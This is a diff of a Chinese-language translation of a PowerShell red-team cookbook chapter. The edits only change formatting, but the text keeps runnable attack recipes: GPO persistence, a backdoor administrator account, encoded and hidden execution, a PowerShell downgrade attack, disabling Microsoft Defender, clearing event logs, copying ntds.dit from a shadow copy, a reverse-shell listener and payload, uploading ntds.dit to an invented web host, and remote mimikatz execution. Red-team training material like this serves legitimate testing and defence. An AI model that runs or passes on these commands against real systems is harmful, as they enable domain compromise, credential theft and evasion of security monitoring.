-在这个示例中，我们创建了一个名为**PersistentScript**的 GPO。接下来，我们在启动文件夹中添加一个组策略注册表值，并将其配置为每次系统启动时通过 PowerShell（使用**ExecutionPolicy Bypass**参数）运行我们的脚本。这样，脚本将在组策略应用的每个系统启动时运行，无论执行策略如何配置。
+在这个示例中，我们创建了一个名为`PersistentScript`的 GPO。接下来，我们在启动文件夹中添加一个组策略注册表值，并将其配置为每次系统启动时通过 PowerShell（使用`ExecutionPolicy Bypass`参数）运行我们的脚本。这样，脚本将在组策略应用的每个系统启动时运行，无论执行策略如何配置。
 
-最后，刚创建的 GPO 只需要应用到一个或多个目标系统。这可以通过**New-GPLink** cmdlet 来完成：
+最后，刚创建的 GPO 只需要应用到一个或多个目标系统。这可以通过`New-GPLink` cmdlet 来完成：
 
 ```
 > New-GPLink -Name "PersistentScript" -Target "DC=domain,DC=local"
@@ -722,7 +722,7 @@ Set-GPRegistryValue -Name "PersistentScript" -Key "HKLM\Software\Policies\Micros
 
 #### 解决方案
 
-有多种方法可以实现你的目标。例如，你可以结合使用 **New-LocalUser** 和 **Add-LocalGroupMember** 来创建一个新用户并将其添加到现有组中：
+有多种方法可以实现你的目标。例如，你可以结合使用 `New-LocalUser` 和 `Add-LocalGroupMember` 来创建一个新用户并将其添加到现有组中：
 
 ```
 > $pass = ConvertTo-SecureString "Hacked!123" -AsPlainText -Force
@@ -730,7 +730,7 @@ Set-GPRegistryValue -Name "PersistentScript" -Key "HKLM\Software\Policies\Micros
 > Add-LocalGroupMember -Group Administrators -Member hacker
 ```
 
-另外，你可以使用 **net.exe** 来成功实现：
+另外，你可以使用 `net.exe` 来成功实现：
 
 ```
 > net user hacker Hacked!123 /add /Y
@@ -747,7 +747,7 @@ Set-GPRegistryValue -Name "PersistentScript" -Key "HKLM\Software\Policies\Micros
 
 #### 解决方案
 
-你可以通过使用 **-w hidden** 来设置 **WindowStyle**，它是 **-WindowStyle** 的简写：
+你可以通过使用 `-w hidden` 来设置 `WindowStyle`，它是 `-WindowStyle` 的简写：
 
 ```
 > powershell.exe -w hidden -c <command>
@@ -766,15 +766,15 @@ Set-GPRegistryValue -Name "PersistentScript" -Key "HKLM\Software\Policies\Micros
 > powershell.exe -e "<Base64 string>"
 ```
 
-**-e** 参数（**-EncodedCommand** 的简写）允许你直接将 Base64 编码的命令作为命令行参数提供。
+`-e` 参数（`-EncodedCommand` 的简写）允许你直接将 Base64 编码的命令作为命令行参数提供。
 
-只需将 **<Base64 string>** 替换为你的 Base64 编码命令，如以下示例所示：
+只需将 `<Base64 string>` 替换为你的 Base64 编码命令，如以下示例所示：
 
 ```
 > powershell.exe -e "VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACAAVwBvAHIAbABkACEAJwA="
 ```
 
-在这个例子中，Base64 编码的字符串将在 PowerShell 中执行，并且 **“Hello World!”** 会被写入命令行。这是因为这个 Base64 字符串转换为 **"Write-Host '****Hello World!'"**。
+在这个例子中，Base64 编码的字符串将在 PowerShell 中执行，并且 **“Hello World!”** 会被写入命令行。这是因为这个 Base64 字符串转换为 `"Write-Host '****Hello World!'"`。
 
 ### 将字符串转换为 Base64 字符串
 
@@ -782,13 +782,13 @@ Set-GPRegistryValue -Name "PersistentScript" -Key "HKLM\Software\Policies\Micros
 
 #### 解决方案
 
-你可以使用以下代码片段将字符串转换为 Base64 字符串；只需将 **<text>** 替换为你想要转换的字符串：
+你可以使用以下代码片段将字符串转换为 Base64 字符串；只需将 `<text>` 替换为你想要转换的字符串：
 
 ```
 > [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("<text>"))
 ```
 
-以下示例将 **"Write-Host 'Hello World!'"** 字符串转换为 Base64 字符串：
+以下示例将 `"Write-Host 'Hello World!'"` 字符串转换为 Base64 字符串：
 
 ```
 > [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Write-Host 'Hello World!'"))
@@ -806,19 +806,19 @@ Set-GPRegistryValue -Name "PersistentScript" -Key "HKLM\Software\Policies\Micros
 
 #### 解决方案
 
-你可以使用以下代码片段将 Base64 字符串转换回可读的字符串。将 **"<Base64 string>"** 替换为实际的 Base64 字符串：
+你可以使用以下代码片段将 Base64 字符串转换回可读的字符串。将 `"<Base64 string>"` 替换为实际的 Base64 字符串：
 
 ```
 > [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("<Base64 string>"))
 ```
 
-以下示例演示了如何将 **"VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACAAVwBvAHIAbABkACEAJwA="** 字符串转换回可读格式：
+以下示例演示了如何将 `"VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACAAVwBvAHIAbABkACEAJwA="` 字符串转换回可读格式：
 
 ```
 > [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACAAVwBv AHIAbABkACEAJwA="))
 ```
 
-这将得到 **"Write-Host 'Hello** **World!'"** 字符串。
+这将得到 `"Write-Host 'Hello** **World!'"` 字符串。
 
 通常，ASCII 字符串会被编码成 Base64 字符串。如果你使用 Unicode 解码该字符串，你将无法获得期望的输出，正如下图所示：
 
@@ -832,7 +832,7 @@ Set-GPRegistryValue -Name "PersistentScript" -Key "HKLM\Software\Policies\Micros
 > [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("V3JpdGUtSG9zdCAnSGVsbG8gV29ybGQhJw=="))
 ```
 
-这也将导致**"Write-Host 'Hello** **World!'"** 字符串。
+这也将导致`"Write-Host 'Hello** **World!'"` 字符串。
 
 ### 执行降级攻击
 
@@ -840,7 +840,7 @@ Set-GPRegistryValue -Name "PersistentScript" -Key "HKLM\Software\Policies\Micros
 
 #### 解决方案
 
-通过在运行**powershell.exe**时指定 PowerShell 的版本号，可以执行降级攻击：
+通过在运行`powershell.exe`时指定 PowerShell 的版本号，可以执行降级攻击：
 
 ```
 > powershell.exe -version 2 –command <command>
@@ -848,7 +848,7 @@ Set-GPRegistryValue -Name "PersistentScript" -Key "HKLM\Software\Policies\Micros
 
 如果指定的版本已安装，则命令将在使用过时的二进制文件时运行，这意味着仅会应用已在该版本中引入的安全功能。
 
-如果你尝试运行**powershell.exe -version 2**并且收到类似以下代码片段的错误消息，表示缺少 .NET Framework 2.0 版本，这意味着 .NET Framework 2.0 尚未安装在系统中：
+如果你尝试运行`powershell.exe -version 2`并且收到类似以下代码片段的错误消息，表示缺少 .NET Framework 2.0 版本，这意味着 .NET Framework 2.0 尚未安装在系统中：
 
 ```
 > powershell.exe -version 2
@@ -873,15 +873,15 @@ State       : Enabled
 
 #### 解决方案
 
-你可以使用**Set-MpPreference**来实现你的目标：
+你可以使用`Set-MpPreference`来实现你的目标：
 
 ```
 > Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableNetworkProtection AuditMode -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -EnableControlledFolderAccess Disabled -Force
 ```
 
-此命令禁用实时监控、入侵防御系统、**Internet Outbound AntiVirus**（**IOAV**）保护和脚本扫描。它将网络保护设置为仅审核模式（因此不再强制执行），禁用**Microsoft Active Protection Service**（**MAPS**）报告，将同意设置为永不发送样本，并禁用受控文件夹访问。**-Force** 参数确保在没有额外提示的情况下应用这些更改。
+此命令禁用实时监控、入侵防御系统、`Internet Outbound AntiVirus`（**IOAV**）保护和脚本扫描。它将网络保护设置为仅审核模式（因此不再强制执行），禁用`Microsoft Active Protection Service`（**MAPS**）报告，将同意设置为永不发送样本，并禁用受控文件夹访问。`-Force` 参数确保在没有额外提示的情况下应用这些更改。
 
-如果你想篡改本示例中未显示的其他功能，请参阅**Set-MpPreference**文档：https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference。
+如果你想篡改本示例中未显示的其他功能，请参阅`Set-MpPreference`文档：https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference。
 
 ### 清除日志
 
@@ -904,11 +904,11 @@ Get-WinEvent -ListLog * | foreach {
 
 ### 导出 ntds.dit 文件
 
-你想要窃取包含所有身份和哈希值的**ntds.dit**文件，这些信息存在于 Active Directory 中。
+你想要窃取包含所有身份和哈希值的`ntds.dit`文件，这些信息存在于 Active Directory 中。
 
 #### 解决方案
 
-由于**ntds.dit**文件被 Active Directory 不断使用并因此被锁定，你需要找到访问**ntds.dit**的方法。一种方法是创建影像副本，创建符号链接，并从中提取该文件：
+由于`ntds.dit`文件被 Active Directory 不断使用并因此被锁定，你需要找到访问`ntds.dit`的方法。一种方法是创建影像副本，创建符号链接，并从中提取该文件：
 
 ```
 $ShadowCopy = Invoke-CimMethod -ClassName "Win32_ShadowCopy" -Namespace "root\cimv2" -MethodName "Create" -Arguments @{Volume="C:\"}
@@ -916,7 +916,7 @@ $ShadowCopyPath = (Get-CimInstance -ClassName Win32_ShadowCopy | Where-Object { 
 cmd /c mklink /d C:\shadowcopy "$ShadowCopyPath"
 ```
 
-现在你可以无错误地访问**ntds.dit**文件，并提取它或继续提取身份。在这个示例中，我们将其复制到**C:\tmp**以供进一步使用：
+现在你可以无错误地访问`ntds.dit`文件，并提取它或继续提取身份。在这个示例中，我们将其复制到`C:\tmp`以供进一步使用：
 
 ```
 > Copy-Item "C:\shadowcopy\Windows\NTDS\ntds.dit" -Destination "C:\tmp"
@@ -938,7 +938,7 @@ cmd /c mklink /d C:\shadowcopy "$ShadowCopyPath"
 
 #### 解决方案
 
-为了实现你的目标，你可以使用**whoami**命令：
+为了实现你的目标，你可以使用`whoami`命令：
 
 ```
 > whoami
@@ -958,20 +958,20 @@ cmd /c mklink /d C:\shadowcopy "$ShadowCopyPath"
 > Get-CimInstance -ClassName Win32_UserAccount
 ```
 
-为了仅枚举本地用户，你可以使用**Get-LocalUser**或**net users**：
+为了仅枚举本地用户，你可以使用`Get-LocalUser`或`net users`：
 
 ```
 > Get-LocalUser
 > net users
 ```
 
-有多种方法仅枚举域用户。如果存在**ActiveDirectory**模块，你可以使用**Get-ADUser**：
+有多种方法仅枚举域用户。如果存在`ActiveDirectory`模块，你可以使用`Get-ADUser`：
 
 ```
 > Get-ADUser
 ```
 
-但在大多数情况下，**ActiveDirectory**模块不会存在，所以你可以利用**adsisearcher**枚举所有域用户：
+但在大多数情况下，`ActiveDirectory`模块不会存在，所以你可以利用`adsisearcher`枚举所有域用户：
 
 ```
 $domain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select-Object -ExpandProperty Domain
@@ -981,7 +981,7 @@ $searcher.SearchRoot = "LDAP://$domain"
 $searcher.FindAll() | ForEach-Object {$_.GetDirectoryEntry().Name}
 ```
 
-也可以使用**net**来枚举所有域用户：
+也可以使用`net`来枚举所有域用户：
 
 ```
 > net user /domain
@@ -1001,26 +1001,26 @@ $searcher.FindAll() | ForEach-Object {$_.GetDirectoryEntry().Name}
 > Get-CimInstance -ClassName Win32_Group
 ```
 
-为了仅枚举本地组，你可以使用**Get-LocalGroup**或**net localgroups**：
+为了仅枚举本地组，你可以使用`Get-LocalGroup`或`net localgroups`：
 
 ```
 > Get-LocalGroup
 > net localgroups
 ```
 
-有多种方法仅枚举域用户。如果存在**ActiveDirectory**模块，你可以使用**Get-ADGroup**：
+有多种方法仅枚举域用户。如果存在`ActiveDirectory`模块，你可以使用`Get-ADGroup`：
 
 ```
 > Get-ADGroup
 ```
 
-由于大多数情况下并非如此，你也可以利用**net**来查找存在的域组：
+由于大多数情况下并非如此，你也可以利用`net`来查找存在的域组：
 
 ```
 > net group /domain
 ```
 
-你也可以使用**adsisearcher**枚举所有域组，如下所示的代码片段所示：
+你也可以使用`adsisearcher`枚举所有域组，如下所示的代码片段所示：
 
 ```
 $domain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select-Object -ExpandProperty Domain
@@ -1035,19 +1035,19 @@ $searcher.FindAll() | ForEach-Object {$_.GetDirectoryEntry().Name}
 
 #### 解决方案
 
-使用**hostname**命令，你可以查找当前机器的主机名：
+使用`hostname`命令，你可以查找当前机器的主机名：
 
 ```
 > hostname
 ```
 
-通过使用**systeminfo**命令，你可以检索当前机器的详细系统配置信息：
+通过使用`systeminfo`命令，你可以检索当前机器的详细系统配置信息：
 
 ```
 > systeminfo
 ```
 
-**Systeminfo** 让你收集有关当前系统的各种信息，如硬件属性、当前操作系统版本、主机名、BIOS 版本、启动时间等有价值的信息。
+`Systeminfo` 让你收集有关当前系统的各种信息，如硬件属性、当前操作系统版本、主机名、BIOS 版本、启动时间等有价值的信息。
 
 ### 枚举与网络相关的信息
 
@@ -1061,25 +1061,25 @@ $searcher.FindAll() | ForEach-Object {$_.GetDirectoryEntry().Name}
 > ipconfig /all
 ```
 
-**ipconfig /all** 显示有关系统上所有网络接口的详细信息（包括 IP 地址、子网掩码、默认网关、DNS 服务器等）：
+`ipconfig /all` 显示有关系统上所有网络接口的详细信息（包括 IP 地址、子网掩码、默认网关、DNS 服务器等）：
 
 ```
 > Get-NetAdapter | fl
 ```
 
-使用**Get-NetAdapter**，你可以检索网络适配器及其属性的信息，如接口索引、名称、MAC 地址等：
+使用`Get-NetAdapter`，你可以检索网络适配器及其属性的信息，如接口索引、名称、MAC 地址等：
 
 ```
 > route print
 ```
 
-**route print** 显示系统的路由表，展示网络目标、相关的网关地址以及接口信息：
+`route print` 显示系统的路由表，展示网络目标、相关的网关地址以及接口信息：
 
 ```
 > arp -A
 ```
 
-**arp -a** 显示**地址解析协议**（**ARP**）缓存，其中包含将 IP 地址映射到本地网络设备的 MAC 地址。通过这样做，你可以轻松发现潜在的横向移动目标。
+`arp -a` 显示**地址解析协议**（**ARP**）缓存，其中包含将 IP 地址映射到本地网络设备的 MAC 地址。通过这样做，你可以轻松发现潜在的横向移动目标。
 
 ### 枚举域信息
 
@@ -1087,25 +1087,25 @@ $searcher.FindAll() | ForEach-Object {$_.GetDirectoryEntry().Name}
 
 #### 解决方案
 
-你可以利用**System.DirectoryServices.ActiveDirectory**命名空间来枚举当前域和林：
+你可以利用`System.DirectoryServices.ActiveDirectory`命名空间来枚举当前域和林：
 
 ```
 > [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 ```
 
-**GetCurrentDomain()** 命令检索 Active Directory 中的当前域对象，并返回域名、域控制器以及其他属性的信息：
+`GetCurrentDomain()` 命令检索 Active Directory 中的当前域对象，并返回域名、域控制器以及其他属性的信息：
 
 ```
 > ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
 ```
 
-**GetCurrentDomain()).GetAllTrustRelationships()** 命令检索当前域在 Active Directory 中建立的所有信任关系，并提供受信任域及其属性的信息：
+`GetCurrentDomain()).GetAllTrustRelationships()` 命令检索当前域在 Active Directory 中建立的所有信任关系，并提供受信任域及其属性的信息：
 
 ```
 > [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
 ```
 
-**GetCurrentForest()** 命令检索 Active Directory 中的当前林对象，并返回林名、域树和其他属性的信息：
+`GetCurrentForest()` 命令检索 Active Directory 中的当前林对象，并返回林名、域树和其他属性的信息：
 
 ```
 > ([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()
@@ -1119,7 +1119,7 @@ $searcher.FindAll() | ForEach-Object {$_.GetDirectoryEntry().Name}
 
 #### 解决方案
 
-你可以使用**nltest**查询并列出指定域中所有可用的 DC：
+你可以使用`nltest`查询并列出指定域中所有可用的 DC：
 
 ```
 > nltest /dclist:PSSEC.local
@@ -1159,20 +1159,20 @@ $searcher.FindAll() | ForEach-Object {$_.GetDirectoryEntry().Name}
 
 #### 解决方案
 
-要在远程（或本地）机器上执行单个命令或二进制文件，可以利用**Invoke-Command**：
+要在远程（或本地）机器上执行单个命令或二进制文件，可以利用`Invoke-Command`：
 
 ```
 > Invoke-Command <ip address or hostname> {<scriptblock/binary>}
 ```
 
-以下示例展示了如何在远程主机**PSSec-PC01**上执行**Get-Process** cmdlet 和**mimikatz.exe**二进制文件：
+以下示例展示了如何在远程主机`PSSec-PC01`上执行`Get-Process` cmdlet 和`mimikatz.exe`二进制文件：
 
 ```
 > Invoke-Command PSSec-PC01 {Get-Process}
 > Invoke-Command PSSec-PC01 {C:\tmp\mimikatz.exe}
 ```
 
-如果你想对一个 IP 地址使用**Invoke-Command**，确保远程主机的 IP 已出现在**TrustedHosts**中，并且已配置为远程访问。
+如果你想对一个 IP 地址使用`Invoke-Command`，确保远程主机的 IP 已出现在`TrustedHosts`中，并且已配置为远程访问。
 
 ### 启动远程交互式 PowerShell 会话
 
@@ -1180,13 +1180,13 @@ $searcher.FindAll() | ForEach-Object {$_.GetDirectoryEntry().Name}
 
 #### 解决方案
 
-你可以使用**Enter-PSSession**来启动一个交互式远程 PowerShell 会话：
+你可以使用`Enter-PSSession`来启动一个交互式远程 PowerShell 会话：
 
 ```
 Enter-PSSession <ip address or hostname>
 ```
 
-在这种情况下，我们将建立到远程主机**PSSec-PC01**的 PowerShell 会话：
+在这种情况下，我们将建立到远程主机`PSSec-PC01`的 PowerShell 会话：
 
 ```
 > Enter-PSSession PSSec-PC01
@@ -1212,7 +1212,7 @@ $listener.Start()
 $client = $listener.AcceptTcpClient()
 ```
 
-一旦监听器启动，它会等待连接，并立即接受连接，并将会话存储在**$****client**变量中。
+一旦监听器启动，它会等待连接，并立即接受连接，并将会话存储在`$****client`变量中。
 
 让**受害者机器**执行你的有效负载。可能会是这样的形式：
 
@@ -1239,7 +1239,7 @@ $reader.Close()
 $client.Close()
 ```
 
-这段代码创建一个新的 TCP 套接字，连接到**172.29.0.20** IP 地址上的**4444**端口，一旦连接成功，它会等待输入。客户端现在可以读取传入的命令或写入命令行。
+这段代码创建一个新的 TCP 套接字，连接到`172.29.0.20` IP 地址上的`4444`端口，一旦连接成功，它会等待输入。客户端现在可以读取传入的命令或写入命令行。
 
 再次，在 C2 服务器上，你现在可以通过流发送命令：
 
@@ -1274,16 +1274,16 @@ $client.Close()
 
 #### 解决方案
 
-你可以通过读取目标文件的字节，将它们转换为**Base64**字符串，并使用**Invoke-WebRequest**将其上传到 Web 服务器来实现目标：
+你可以通过读取目标文件的字节，将它们转换为`Base64`字符串，并使用`Invoke-WebRequest`将其上传到 Web 服务器来实现目标：
 
 ```
 > $FileContent = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\shadowcopy\Windows\NTDS\ntds.dit"))
 > Invoke-WebRequest -uri http://PSSec-example.com/upload -Method POST -Body $FileContent
 ```
 
-在这个例子中，我们将之前提取的 Base64 编码的**ntds.dit**文件作为影像副本上传到**http://PSSec-example.com/upload**（该网址并不存在，我们只是为了这个示例虚构的）。
+在这个例子中，我们将之前提取的 Base64 编码的`ntds.dit`文件作为影像副本上传到`http://PSSec-example.com/upload`（该网址并不存在，我们只是为了这个示例虚构的）。
 
-也可以使用**System.NET.WebClient**类来提取和上传文件。以下代码片段展示了如何实现这一目标：
+也可以使用`System.NET.WebClient`类来提取和上传文件。以下代码片段展示了如何实现这一目标：
 
 ```
 > $FileToUpload = "C:\shadowcopy\Windows\NTDS\ntds.dit"
@@ -1300,13 +1300,13 @@ $client.Close()
 
 #### 解决方案
 
-为此，你可以使用**Stop-Service** cmdlet：
+为此，你可以使用`Stop-Service` cmdlet：
 
 ```
 > Stop-Service -Name Spooler -Force
 ```
 
-如果执行该命令，之前的命令将停止**Spooler**服务。使用**-Force**参数时，服务将会在没有确认提示的情况下被强制停止。
+如果执行该命令，之前的命令将停止`Spooler`服务。使用`-Force`参数时，服务将会在没有确认提示的情况下被强制停止。
 
 ### 关闭系统
 
@@ -1314,27 +1314,27 @@ $client.Close()
 
 #### 解决方案
 
-你可以通过多种方法来实现你的目标。其中一种方法是使用**Stop-Computer** cmdlet：
+你可以通过多种方法来实现你的目标。其中一种方法是使用`Stop-Computer` cmdlet：
 
 ```
 > Stop-Computer -ComputerName localhost
 ```
 
-使用**-ComputerName**参数，你可以指定是否要关闭本地计算机或远程主机。
+使用`-ComputerName`参数，你可以指定是否要关闭本地计算机或远程主机。
 
-你也可以使用**shutdown**命令：
+你也可以使用`shutdown`命令：
 
 ```
 > shutdown /s /t 0
 ```
 
-**/s**参数表示系统将关闭。**/t**参数表示命令执行前会经过多少秒。在此案例中，系统会立即关闭。
+`/s`参数表示系统将关闭。`/t`参数表示命令执行前会经过多少秒。在此案例中，系统会立即关闭。
 
 # 总结
 
 在本章中，你学习了攻击的不同阶段。你了解到了一些常见的 PowerShell 红队工具，并获得了一本红队食谱，可以帮助你在下次红队演习中使用。
 
-这本红队食谱包含了许多有用的代码片段，帮助你了解使用**powershell.exe**时的一些重要选项，如何使用 Base64 进行混淆，如何下载文件，以及如何只在内存中执行脚本。它还提醒你如何在远程机器上执行命令，以及如何打开会话。
+这本红队食谱包含了许多有用的代码片段，帮助你了解使用`powershell.exe`时的一些重要选项，如何使用 Base64 进行混淆，如何下载文件，以及如何只在内存中执行脚本。它还提醒你如何在远程机器上执行命令，以及如何打开会话。
 
 我们查看了如何使用 PowerShell 建立持久性以及如何执行降级攻击的几种选项。你还复习了内存注入的工作原理，以及如何在没有任何常见红队工具的情况下打开反向 shell。最后，你学会了如何清除日志。
 
@@ -1350,11 +1350,11 @@ $client.Close()
 
 +   https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor.pdf
 
-**New-GPLink**：
+`New-GPLink`：
 
 +   https://learn.microsoft.com/en-us/powershell/module/grouppolicy/new-gplink
 
-**PowerUpSQL**：
+`PowerUpSQL`：
 
 +   https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
 
